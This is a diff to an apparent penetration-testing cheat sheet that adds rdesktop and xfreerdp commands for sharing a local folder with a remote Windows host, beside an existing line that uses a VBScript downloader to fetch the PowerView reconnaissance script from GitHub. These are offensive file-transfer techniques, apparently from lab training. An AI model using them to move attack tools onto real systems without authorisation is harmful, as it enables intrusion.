@@ -1123,6 +1123,20 @@ end with
 C:\> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
 ```
 
+- Rdesktop (Windows -> Windows)
+
+```
+$ rdesktop <IP address> -d <domain> -u <username> -p '<password>' -r disk:linux='/home/user/rdesktop/files'
+Browse to \\tsclient\ or use mstsc.exe -> Local Resources -> More -> Drives
+```
+
+- Xfreerdp (Windows -> Windows)
+
+```
+$ xfreerdp /v:<IP address> /d:<domain> /u:<username> /p:'<password>' /drive:linux,/home/plaintext/htb/academy/filetransfer
+Browse to \\tsclient\ or use mstsc.exe -> Local Resources -> More -> Drives
+```
+
 #8. - Restricted Shell Escapes
 -----------------------------------------
 
